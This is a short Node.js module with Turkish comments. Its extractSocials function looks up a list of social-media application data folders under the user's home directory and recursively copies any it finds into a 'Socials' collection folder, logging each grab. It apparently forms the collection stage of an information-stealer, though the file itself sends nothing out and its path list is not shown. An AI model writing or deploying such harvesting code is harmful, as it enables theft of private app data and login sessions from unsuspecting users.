const fs = require('fs');
const path = require('path');
const os = require('os');
const { GetSocialPaths } = require('./socialPaths');

/**
 * Belirlenen sosyal medya veri yollarını tarar ve bulduklarını belirli bir konuma kopyalar.
 * @param {string} targetDir - Verilerin kopyalanacağı hedef dizin.
 */
const extractSocials = async (targetDir) => {
    const paths = GetSocialPaths();
    let foundCount = 0;

    for (const [name, relativePath] of Object.entries(paths)) {
        const fullPath = path.join(os.homedir(), relativePath);
        
        if (fs.existsSync(fullPath)) {
            const destPath = path.join(targetDir, 'Socials', name);
            
            try {
                if (!fs.existsSync(path.dirname(destPath))) {
                    fs.mkdirSync(path.dirname(destPath), { recursive: true });
                }
                
                // Klasör kopyalama işlemi (basitleştirilmiş)
                copyRecursiveSync(fullPath, destPath);
                foundCount++;
                console.log(`[+] ${name} verileri kopyalandı.`);
            } catch (err) {
                console.error(`[-] ${name} kopyalanırken hata oluştu:`, err.message);
            }
        }
    }

    return { found: foundCount };
};

/**
 * Yardımcı fonksiyon: Klasörü içindekilerle birlikte kopyalar.
 */
function copyRecursiveSync(src, dest) {
    const exists = fs.existsSync(src);
    const stats = exists && fs.lstatSync(src);
    const isDirectory = exists && stats.isDirectory();
    if (isDirectory) {
        if (!fs.existsSync(dest)) {
            fs.mkdirSync(dest);
        }
        fs.readdirSync(src).forEach((childItemName) => {
            copyRecursiveSync(path.join(src, childItemName), path.join(dest, childItemName));
        });
    } else {
        fs.copyFileSync(src, dest);
    }
}

module.exports = { extractSocials };